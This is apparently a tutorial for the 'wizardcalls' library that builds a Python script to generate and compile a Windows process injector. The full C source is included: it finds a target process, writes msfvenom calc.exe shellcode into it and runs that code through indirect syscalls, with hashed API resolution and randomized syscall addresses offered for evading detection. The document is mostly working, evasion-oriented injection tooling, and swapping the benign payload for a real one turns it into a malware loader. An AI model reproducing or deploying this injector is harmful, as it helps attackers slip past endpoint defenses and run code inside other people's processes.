# Writing a compilation script for the syscall injector
in the [writing an injector with wizardcalls](./Writing-an-injector-with-wizardcalls.md) tutorial, we created a basic injector which locates a process on the host and injects it with calculator shellcode using indirect syscalls sourced from wizardcalls.

This tutorial will demonstrate how wizardcalls can be integrated into a builder script for the injector.

## Step 0; Architecting the script
The script is going to create a compiled injector & offer users the ability to configure how wizardcalls is implemented in the injector.

## Step 1; Defining imports
To start out, we'll need the following packages:

| Package | Usage |
| - | - |
| os | Access to filesystem |
| subprocess | Launching processes |
| argparse | User input |
| random | Random integer for hash seed |
| wizardcalls | Accessing the wizardcalls source |

```py
import os
import subprocess
import argparse
import random
from wizardcalls import WizardCalls
```

## Step 2; Setting up arguments
The arguments are defined in the script block below.

```py
parser.add_argument('-o', '--outfile', help='A name for the compiled executable.', default='skynet.exe')
parser.add_argument('-t', '--target', help='A target process name to inject to. (case sensitive)', default='notepad.exe')
parser.add_argument('-a', '--algo', help='A hashing algorithm for dynamic api resolution', choices=['djb2', 'sdbm'], default='djb2')
parser.add_argument('-r', '--random_jump', help='Jump to a random syscall isntruction address when executing the syscall for callstack obfuscation', default=False)
parser.add_argument('-d', '--debug', help='enable debug statements for wizardcalls', default=False)
```

These arguments enable script users to configure things such as the injectors file name, the remote injection target, syscall jump address randomization & more.

## Step 3; Adding the injectors source
In this step, we define a variable **main_source** which holds the wizardcalls compatible source code for the injector. The script block has been ommitted from the documentation to save space. It's a big string, i'm sure we've all seen a big string before. 

## Step 4; Initializing the WizardCalls object
Now, we'll need to initalize the wizardcalls object with the neccessary syscalls for the injector & user input parameters in the correct place for configuration initialization.
```py
wizard = WizardCalls(
    syscalls = [
        'NtWaitForSingleObject', 
        'NtOpenProcess', 
        'NtQuerySystemInformation', 
        'NtAllocateVirtualMemory', 
        'NtWriteVirtualMemory', 
        'NtProtectVirtualMemory', 
        'NtCreateThreadEx'
    ],
    syscall_list_name       = 'pSyscallList',
    hash_seed               = random.randint(0, 10000),
    randomize_jump_address  = args.random_jump,
    debug                   = args.debug,
    hash_algo               = args.algo,
    globals                 = True
)
```

## Step 5; Compiler code
We'll need to define some code to run in a script which compiles the source code. In this example, we use MSVC on windows.
```py
compiler_code = f"""@echo off
call "C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\VC\\Auxiliary\\Build\\vcvars64.bat"
ml64.exe /c /Fo wizardcalls.x64.obj "{ wizard.asm_source.filename }"
cl main.c { wizard.source.filename } wizardcalls.x64.obj /O2
link.exe main.obj wizardcalls.obj wizardcalls.x64.obj
"""
```

## Step 6; Writing everything to disk
It's time to write all of the source & compilation files to disk. For simplicity, we'll use the current working directory of the script as the destination directory.
```py
wizard.source.write_to_dir('.')
wizard.header.write_to_dir('.')
wizard.asm_source.write_to_dir('.')

with open('main.c', 'w') as main:
    main.write(main_source)

with open('compile.bat', 'w') as compiler:
    compiler.write(compiler_code)
```

## Step 7; Compiling the injector
It's time to compile the injector. This will be done by running the compiler script with the subprocess module.
```py
if subprocess.run( ['cmd.exe', '/c', 'compile.bat' ], check=False, capture_output=True ).returncode != 0:
    assert "Failed to compile the source code."
```

## Step 8; Cleanup
Finally, it's time to remove all of the source code files to keep things clean.
```py
os.remove(wizard.asm_source.filename)
os.remove(wizard.source.filename)
os.remove(wizard.header.filename)
os.remove('compile.bat')
os.remove('main.c')
os.remove('wizardcalls.obj')
os.remove('wizardcalls.x64.obj')
os.remove('main.obj')
```

# Final Script
At this point, we've completed the script. Below is an example script using the components explained above. This is a basic script which takes various arguments from the user & compiles the injector based on those arguments. This demonstrates how wizardcalls can be used in a script which compiles another software dependant on wizardcalls.

```py
import os
import subprocess
import argparse
import random
from wizardcalls import WizardCalls

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-o', '--outfile', help='A name for the compiled executable.', default='skynet.exe')
    parser.add_argument('-t', '--target', help='A target process name to inject to. (case sensitive)', default='notepad.exe')
    parser.add_argument('-a', '--algo', help='A hashing algorithm for dynamic api resolution', choices=['djb2', 'sdbm'], default='djb2')
    parser.add_argument('-r', '--random_jump', help='Jump to a random syscall isntruction address when executing the syscall for callstack obfuscation', default=False)
    parser.add_argument('-d', '--debug', help='enable debug statements for wizardcalls', default=False)
    args = parser.parse_args()

    main_source = fr"""# define _CRT_SECURE_NO_WARNINGS
# include "wizardcalls.h"
# include <winternl.h>
# include <stdio.h>

# define STATUS_INFO_LENGTH_MISMATCH 0xC0000004
# define SUCCESS 0x0

# define TARGET_PROCESS L"{args.target}"

/* msfvenom -p windows/x64/exec cmd=calc.exe exitfunc=thread */
unsigned char shellcode[] = {{
	0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
	0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52,
	0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
	0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed,
	0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88,
	0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
	0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48,
	0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1,
	0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
	0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49,
	0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a,
	0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
	0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b,
	0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
	0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47,
	0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e,
	0x65, 0x78, 0x65, 0x00
}};

int main() {{

    PVOID                       pSPIBuffer               = 0,
                                pShellcode               = 0;
    ULONG                       SPIBufferLength          = 0,
                                SPIBufferLength2         = 0,
                                OldProtection            = 0;
    NTSTATUS                    Status                   = 0;
    PSYSTEM_PROCESS_INFORMATION pProcess                 = 0,
                                hThread                  = 0;
    HANDLE                      hTargetProcess           = 0;
    SIZE_T                      BytesWritten             = 0,
                                ShellcodeSize            = sizeof(shellcode);
    CLIENT_ID                   ClientId                 = {{ 0 }};
    OBJECT_ATTRIBUTES           OA                       = {{ 0 }};
    LARGE_INTEGER               LargeInt                 = {{ 0 }};

    InitializeObjectAttributes(&OA, NULL, 0, NULL, NULL);

    /* --- Initialize system calls --- */
    WzDInit();

    /* --- Get a handle to the target process --- */

    Status = NtQuerySystemInformation( SystemProcessInformation, 0, 0, &SPIBufferLength );
    if ( Status != STATUS_INFO_LENGTH_MISMATCH && Status != SUCCESS )
    {{
        printf("Could not get the required buffer length. Error: 0x%0.8X\n", Status);
        return -1;
    }}

    Status = NtAllocateVirtualMemory( ( HANDLE )-1, &pSPIBuffer, 0, ( PSIZE_T )&SPIBufferLength, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
    if ( Status != SUCCESS )
    {{
        printf("Failed to allocate buffer for processes. Error 0x%0.8X\n", Status);
        return -1;
    }}

    Status = NtQuerySystemInformation( SystemProcessInformation, pSPIBuffer, SPIBufferLength, &SPIBufferLength2);
    if ( Status != SUCCESS )
    {{
        printf("Could not get system processes. Error: 0x%0.8X\n", Status );
        return -1;
    }}

    pProcess = ( PSYSTEM_PROCESS_INFORMATION )pSPIBuffer;

    while ( pProcess->NextEntryOffset != 0 )
    {{
        if ( pProcess->ImageName.Buffer != 0 )
        {{
            if ( wcscmp( pProcess->ImageName.Buffer, TARGET_PROCESS ) == 0)
            {{
                ClientId.UniqueProcess = pProcess->UniqueProcessId;
                Status = NtOpenProcess( &hTargetProcess, PROCESS_ALL_ACCESS, &OA, &ClientId );
                if (Status != SUCCESS)
                {{
                    printf( "Failed to open handle to %S. Error: 0x%0.8X\n", TARGET_PROCESS, Status );
                    return -1;
                }}
                printf("Acuired handle to %S (%d)\n", pProcess->ImageName.Buffer, ( DWORD)(DWORD_PTR)pProcess->UniqueProcessId);
                break;
            }}
        }}
        pProcess = ( PSYSTEM_PROCESS_INFORMATION )( (PBYTE)pProcess + pProcess->NextEntryOffset );
    }}

    if ( !hTargetProcess )
    {{
        printf("Could not find %S\n", TARGET_PROCESS);
        return -1;
    }}

    /* --- Inject shellcode to target process ---*/
    Status = NtAllocateVirtualMemory( hTargetProcess, &pShellcode, 0, &ShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
    if ( Status != SUCCESS )
    {{
        printf("Could not allocate buffer for shellcode\n");
        return -1;
    }}

    Status = NtWriteVirtualMemory( hTargetProcess, pShellcode, shellcode, ShellcodeSize, &BytesWritten);
    if ( Status != SUCCESS )
    {{
        printf("Could not write shellcode to target buffer in %S\n", TARGET_PROCESS);
        return -1;
    }}

    Status = NtProtectVirtualMemory( hTargetProcess, &pShellcode, &ShellcodeSize, PAGE_EXECUTE_READ, &OldProtection );
    if ( Status != SUCCESS )
    {{
        printf( "Could not set memory protections on shellcode buffer in %S\n", TARGET_PROCESS );
        return -1;
    }}
    
    Status = NtCreateThreadEx( &hThread, THREAD_ALL_ACCESS, &OA, hTargetProcess, pShellcode, 0, 0, 0, 0, 0, 0);
    if ( Status != SUCCESS )
    {{
        printf( "Failed to create thread in %S\n", TARGET_PROCESS );
        return -1;
    }}

    LargeInt.QuadPart = INFINITE;
    
    NtWaitForSingleObject( hThread, FALSE, &LargeInt);
    printf("DONE!");
    return 0;
}}
"""
    try:
        wizard = WizardCalls(
            syscalls = [
                'NtWaitForSingleObject', 
                'NtOpenProcess', 
                'NtQuerySystemInformation', 
                'NtAllocateVirtualMemory', 
                'NtWriteVirtualMemory', 
                'NtProtectVirtualMemory', 
                'NtCreateThreadEx'
            ],
            syscall_list_name       = 'pSyscallList',
            hash_seed               = random.randint(0, 10000),
            randomize_jump_address  = args.random_jump,
            debug                   = args.debug,
            hash_algo               = args.algo,
            globals                 = True
        )

        compiler_code = f"""@echo off
    call "C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\VC\\Auxiliary\\Build\\vcvars64.bat"
    ml64.exe /c /Fo wizardcalls.x64.obj "{ wizard.asm_source.filename }"
    cl main.c { wizard.source.filename } wizardcalls.x64.obj /O2
    link.exe main.obj wizardcalls.obj wizardcalls.x64.obj
    """

        wizard.source.write_to_dir('.')
        wizard.header.write_to_dir('.')
        wizard.asm_source.write_to_dir('.')

        with open('main.c', 'w') as main:
            main.write(main_source)
        
        with open('compile.bat', 'w') as compiler:
            compiler.write(compiler_code)

            # Run compiler script, remove temp dir & return status
        if subprocess.run( ['cmd.exe', '/c', 'compile.bat' ], check=False, capture_output=True ).returncode != 0:
            assert "Failed to compile the source code."
        
        print(f'Saved binary to {os.path.abspath(args.outfile)}')

        os.remove(wizard.asm_source.filename)
        os.remove(wizard.source.filename)
        os.remove(wizard.header.filename)
        os.remove('compile.bat')
        os.remove('main.c')
        os.remove('wizardcalls.obj')
        os.remove('wizardcalls.x64.obj')
        os.remove('main.obj')
    except Exception as e:
        print(f"An exception occured while building the software. Error: {e}")
```